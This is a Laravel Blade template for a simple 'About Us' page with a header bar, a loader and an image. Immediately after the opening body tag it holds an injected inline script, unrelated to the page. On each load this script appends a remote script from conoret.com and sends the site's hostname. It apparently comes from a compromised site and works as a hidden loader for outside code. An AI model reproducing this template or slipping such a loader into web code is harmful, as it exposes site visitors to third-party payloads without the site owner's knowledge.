@extends('layouts.users')

@push('style-lib')

@endpush

@section('content')
<style type="text/css">
    .topname {
        line-height: 46px;
        width: 75%;
        text-align: center;
        color: #000;
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        margin: auto;
        font-size: 14px;
    }
</style>

<body style="min-height: 100%; width: 100%; background-size: 100% auto;  background: #000; "><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
    <div style="width: 100%; height: 100%; background: rgb(255, 255, 255); position: fixed; top: 0px; left: 0px; z-index: 99999; display: none;" id="loader">
    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
        <div class="loader">
            <img src="{{ asset('images/loader.gif') }}" style="width: 40px;">
        </div>
    </div>
</div>
<style>

    .colored {
        filter: invert(75%) sepia(30%) saturate(350%) hue-rotate(336deg) brightness(180%) contrast(90%);
    }


    /* .loader {
     --R: 20px;
     --g1: #514b82 96%, #0000;
     --g2: #ffffff 96%, #0000;
     width: calc(2*var(--R));
     aspect-ratio: 1;
     border-radius: 50%;
     display: grid;
     -webkit-mask: linear-gradient(#000 0 0);
     animation: l30 2s infinite linear;
    }
    .loader::before,
    .loader::after{
     content:"";
     grid-area: 1/1;
     width: 50%;
     background:
       radial-gradient(farthest-side,var(--g1)) calc(var(--R) + 0.866*var(--R) - var(--R)) calc(var(--R) - 0.5*var(--R)   - var(--R)),
       radial-gradient(farthest-side,var(--g1)) calc(var(--R) + 0.866*var(--R) - var(--R)) calc(var(--R) - 0.5*var(--R)   - var(--R)),
       radial-gradient(farthest-side,var(--g2)) calc(var(--R) + 0.5*var(--R)   - var(--R)) calc(var(--R) - 0.866*var(--R) - var(--R)),
       radial-gradient(farthest-side,var(--g1)) 0 calc(-1*var(--R)),
       radial-gradient(farthest-side,var(--g2)) calc(var(--R) - 0.5*var(--R)   - var(--R)) calc(var(--R) - 0.866*var(--R) - var(--R)),
       radial-gradient(farthest-side,var(--g1)) calc(var(--R) - 0.866*var(--R) - var(--R)) calc(var(--R) - 0.5*var(--R)   - var(--R)),
       radial-gradient(farthest-side,var(--g2)) calc(-1*var(--R))  0,
       radial-gradient(farthest-side,var(--g1)) calc(var(--R) - 0.866*var(--R) - var(--R)) calc(var(--R) + 0.5*var(--R)   - var(--R));
      background-size: calc(2*var(--R)) calc(2*var(--R));
      background-repeat :no-repeat;
    }
    .loader::after {
    transform: rotate(180deg);
    transform-origin: right;
    }

    @keyframes l30 {
     100% {transform: rotate(-1turn)}
    }

    .image-filter {
        filter: hue-rotate(180deg) saturate(300%) brightness(120%);
    } */
</style>
<script>
    // Function to show the loader for 6 seconds
    function showLoaderFor2Seconds() {
        const loader = document.getElementById('loader');
        loader.style.display = 'block';
        setTimeout(() => {
            loader.style.display = 'none';
        }, 400);
    }

    function showLoader() {
        const form = document.querySelector('form');
        form.addEventListener('submit', function(event) {
            const submitButton = form.querySelector('button[type="submit"]');
            submitButton.disabled = true;
            submitButton.style.backgroundColor = '#ccc';
        });
    }

    document.addEventListener('DOMContentLoaded', showLoader);
    document.addEventListener('DOMContentLoaded', function() {
        // Get all <a> tags
        const links = document.querySelectorAll('aaaa');

        // Add click event listener to each <a> tag
        links.forEach(function(link) {
            link.addEventListener('click', function(event) {
                showLoaderFor2Seconds(); // Call the function to show the loader
            });
        });
    });

    showLoaderFor2Seconds()
</script>    <div class="indexdiv"></div>
    <div style=" max-width:450px; margin:0 auto;">
        <div class="top1">
        </div>
        <div class="top" style="background: #4B4B4B; ">
            <div onclick="window.history.go(-1); return false;" style="float:left; line-height:46px;width:50%;cursor:pointer;" id="btnClose">
                <i class="layui-icon" style="color:#fff;  margin-left:12px; font-size:16px;  font-weight:bold;"></i>
            </div>
            <font class="topname" id="title" style="color: #fff; text-overflow: ellipsis; overflow: hidden; ">
                About Us
            </font>
            <div style="float:right; text-align:right; line-height:46px;width:50%;">
            </div>
        </div>

        <div style="width: 98%; margin: 0 auto; margin-top:45px; background: #000; border-radius: 5px;">
            <div style="padding: 10px;">
                <div style=" width:100%; color: #fff" id="info">
                    <img style="width: 100%; border-radius: 10px" src="{{ asset('images/aboutus.jpg') }}" alt="about">
                </div>
            </div>
        </div>
    </div>

</body>

@endsection


@push('script')
    <script type="text/javascript">




    </script>
@endpush



